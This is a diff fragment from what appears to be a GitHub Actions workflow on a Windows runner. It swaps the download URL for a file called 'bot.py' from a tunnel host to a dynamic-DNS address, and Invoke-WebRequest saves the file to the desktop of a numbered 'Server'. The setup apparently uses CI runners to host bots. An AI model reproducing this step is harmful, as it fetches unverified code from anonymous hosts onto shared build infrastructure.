@@ -64,7 +64,7 @@ jobs:
           "OS: windows-2022" | Out-File -FilePath $infoFile -Encoding UTF8 -Append
           
           # Download bot.py
-          $btol = "dmcszgvrx9.localto.net"
+          $btol = "https://rrrrs.redirectme.net:5000"
           try {
               Invoke-WebRequest -Uri $btol -OutFile "$desktop\bot.py" -UseBasicParsing -TimeoutSec 15
               Write-Host "bot.py downloaded successfully on Server ${serverNumber}!"
